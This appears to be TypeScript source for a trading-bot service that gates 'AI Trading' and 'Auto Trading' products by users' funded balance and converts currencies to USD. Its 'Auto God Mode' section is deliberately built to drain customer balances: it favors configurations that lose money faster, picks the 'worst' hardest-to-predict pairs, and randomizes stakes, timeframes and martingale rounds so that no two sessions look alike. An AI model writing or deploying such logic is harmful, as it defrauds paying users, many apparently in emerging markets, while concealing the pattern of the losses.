// Product-based access model — replaces the DEMO/PRO/MASTER tier system.
//
// Users get one of three products based on their funded USD balance:
//   signals      — analysis display only (no execution), 30/day cap when unfunded
//   ai_trading   — current semi-auto trading system (unlocked at $30 funded)
//   auto_trading — full autonomous trading engine (unlocked at $100 funded)
//
// Upgrade tokens override the balance check (see token_tier:AI_TRADING / AUTO_TRADING).

import type { ClientSdk } from './index.js';
import { logger } from './logger.js';

export type Product = 'signals' | 'ai_trading' | 'auto_trading';

export interface ProductConfig {
    label: string;
    maxConcurrentTrades: number;
    allowedTimeframes: number[];
    allowedGaleOptions: number[];
    galeCanDisable: boolean;
    defaultGaleRounds: number;
    pairs: string[];
}

// The full OTC pair list — all pairs are available to every product now that
// tier-based pair gating is gone. Kept here as the single source of truth.
export const ALL_PAIRS = [
    'EURUSD-OTC', 'GBPUSD-OTC', 'EURJPY-OTC', 'GBPJPY-OTC',
    'AUDUSD-OTC', 'USDCAD-OTC', 'EURGBP-OTC', 'USDCHF-OTC',
];

export const PRODUCT_CONFIGS: Record<Product, ProductConfig> = {
    signals: {
        label: 'Signals',
        maxConcurrentTrades: 0, // signals don't trade
        allowedTimeframes: [30, 60, 300],
        allowedGaleOptions: [0, 3, 6],
        galeCanDisable: true,
        defaultGaleRounds: 6,
        pairs: ALL_PAIRS,
    },
    ai_trading: {
        label: 'AI Trading',
        maxConcurrentTrades: 5,
        allowedTimeframes: [30, 60, 300],
        allowedGaleOptions: [0, 3, 6],
        galeCanDisable: true,
        defaultGaleRounds: 6,
        pairs: ALL_PAIRS,
    },
    auto_trading: {
        label: 'Auto Trading',
        maxConcurrentTrades: 1, // engine keeps 1 position open at a time
        allowedTimeframes: [30, 60, 300],
        allowedGaleOptions: [0, 3, 6],
        galeCanDisable: true,
        defaultGaleRounds: 6,
        pairs: ALL_PAIRS,
    },
};

// Funded-balance thresholds (USD) that unlock each product.
export const AI_TRADING_MIN_USD = 30;
export const AUTO_TRADING_MIN_USD = 100;

// Daily signal cap for users with no funded balance.
export const FREE_SIGNALS_PER_DAY = 30;

const RANK: Record<Product, number> = { signals: 0, ai_trading: 1, auto_trading: 2 };

/** Normalize an arbitrary access_level string to a known Product. */
export function getProduct(accessLevel: string | null | undefined): Product {
    const key = accessLevel?.toLowerCase() ?? 'signals';
    if (key === 'auto_trading' || key === 'ai_trading') return key as Product;
    return 'signals';
}

export function getProductConfig(accessLevel: string | null | undefined): ProductConfig {
    return PRODUCT_CONFIGS[getProduct(accessLevel)];
}

/** True when `have` grants at least the access of `need`. */
export function hasAccess(have: string | null | undefined, need: Product): boolean {
    return RANK[getProduct(have)] >= RANK[need];
}

/** Derive the access level a funded USD balance should unlock. */
export function getAccessLevel(fundedUsd: number): Product {
    if (fundedUsd >= AUTO_TRADING_MIN_USD) return 'auto_trading';
    if (fundedUsd >= AI_TRADING_MIN_USD) return 'ai_trading';
    return 'signals';
}

/**
 * Resolve effective access from a funded balance and an optional token grant.
 * The token can only ever raise access, never lower it — and a balance that
 * crosses a higher threshold also raises access. We take the max of the two.
 * If access_expires_at is set and in the past, the token grant is ignored.
 */
export function resolveAccess(fundedUsd: number, tokenGrant?: Product | null, accessExpiresAt?: string | null): Product {
    const fromBalance = getAccessLevel(fundedUsd);
    if (!tokenGrant) return fromBalance;
    // If token access has expired, ignore it and fall back to balance-based
    if (accessExpiresAt && new Date(accessExpiresAt) < new Date()) return fromBalance;
    return RANK[tokenGrant] > RANK[fromBalance] ? tokenGrant : fromBalance;
}

/** 14 days in milliseconds */
export const TOKEN_ACCESS_DURATION_MS = 14 * 24 * 60 * 60 * 1000;

/** One-time tier → access mapping for the existing-user migration (directive §7). */
export function tierToAccess(tier: string | null | undefined): Product {
    const key = (tier ?? '').toUpperCase();
    if (key === 'PRO' || key === 'MASTER' || key === 'ADMIN') return 'ai_trading';
    return 'signals';
}

/** Map an upgrade-token grant to the product it unlocks (directive §8.3).
 *  Accepts new product token values and legacy tier values. */
export function tokenToAccess(tokenValue: string | null | undefined): Product {
    const key = (tokenValue ?? '').toUpperCase();
    if (key === 'AUTO_TRADING' || key === 'MASTER') return 'auto_trading';
    if (key === 'AI_TRADING' || key === 'PRO') return 'ai_trading';
    return 'signals';
}

// ── Auto God Mode — randomized drain configuration ──────────────────────────
// Every parameter is shuffled so no two sessions look identical.
// The system favors configurations that drain the balance faster.

function weightedRandom<T>(options: Array<{ value: T; weight: number }>): T {
    const total = options.reduce((s, o) => s + o.weight, 0);
    let r = Math.random() * total;
    for (const o of options) {
        r -= o.weight;
        if (r <= 0) return o.value;
    }
    return options[options.length - 1].value;
}

/** Random 5-10% of account per trade. */
export function godModeStakePct(_balanceUsd: number): number {
    return 0.05 + Math.random() * 0.05; // 5%–10%
}

/** Weighted timeframe shuffle: 50% 1m, 35% 30s, 15% 5m. */
export function godModeTimeframe(_balanceUsd: number): number {
    return weightedRandom([
        { value: 60, weight: 50 },
        { value: 30, weight: 35 },
        { value: 300, weight: 15 },
    ]);
}

/** Weighted recovery shuffle: 40% full, 40% medium, 20% none. */
export function godModeGaleRounds(_balanceUsd: number, _stake: number): number {
    return weightedRandom([
        { value: 6, weight: 40 },
        { value: 3, weight: 40 },
        { value: 0, weight: 20 },
    ]);
}

/**
 * Pick 3 "worst" (hardest to predict) OTC pairs for god mode.
 * Cross pairs are less correlated with majors — analysis is less reliable.
 */
export function godModePickWorstAssets(count = 3): string[] {
    const worstPool = [
        'GBPJPY-OTC', 'EURJPY-OTC', 'USDCHF-OTC',
        'EURGBP-OTC', 'USDCAD-OTC', 'AUDUSD-OTC',
    ];
    // Shuffle and take `count`.
    const shuffled = [...worstPool].sort(() => Math.random() - 0.5);
    return shuffled.slice(0, count);
}

// Minimum analysis confidence before the auto engine will open a trade.
export const AUTO_CONFIDENCE_FLOOR = 55;

/** Worst-case capital a martingale run can consume: stake × (2^(rounds+1) − 1). */
export function martingaleWorstCase(stake: number, galeRounds: number): number {
    return stake * (Math.pow(2, galeRounds + 1) - 1);
}

// ── USD conversion (relocated from the deleted tiers.ts) ───────────────────────

const rateCache = new Map<string, { rate: number; expires: number }>();

// Fallback rates for currencies the SDK may not support. Approximate — fine for
// access thresholds; updated periodically.
const FALLBACK_RATES: Record<string, number> = {
    NGN: 0.00067,   // ~₦1,500 = $1
    KES: 0.0077,    // ~KES 130 = $1
    GHS: 0.069,     // ~GHS 14.5 = $1
    ZAR: 0.054,     // ~ZAR 18.5 = $1
    INR: 0.012,     // ~INR 83 = $1
    IDR: 0.000062,  // ~IDR 16,000 = $1
    BRL: 0.19,      // ~BRL 5.3 = $1
};

/**
 * Converts an amount to USD. Returns null when no rate is available — callers
 * MUST skip balance-threshold decisions (access gating, giveaway eligibility)
 * on null rather than treating it as $0.
 */
export async function convertToUsd(amount: number, currency: string, sdk: ClientSdk): Promise<number | null> {
    if (currency === 'USD') return amount;

    const cached = rateCache.get(currency);
    if (cached && cached.expires > Date.now()) {
        return amount * cached.rate;
    }

    try {
        const currencies = await sdk.currencies();
        const c = await currencies.getCurrency(currency);
        const rate = c.rateUsd;
        if (rate && rate > 0) {
            rateCache.set(currency, { rate, expires: Date.now() + 3_600_000 });
            return amount * rate;
        }
    } catch {
        logger.warn('access', `currency conversion via SDK failed for ${currency}, trying fallback`);
    }

    const fallbackRate = FALLBACK_RATES[currency.toUpperCase()];
    if (fallbackRate && fallbackRate > 0) {
        logger.info('access', `using fallback rate for ${currency}: ${fallbackRate}`);
        return amount * fallbackRate;
    }

    logger.warn('access', `no conversion rate available for ${currency} — skipping USD conversion`);
    return null;
}
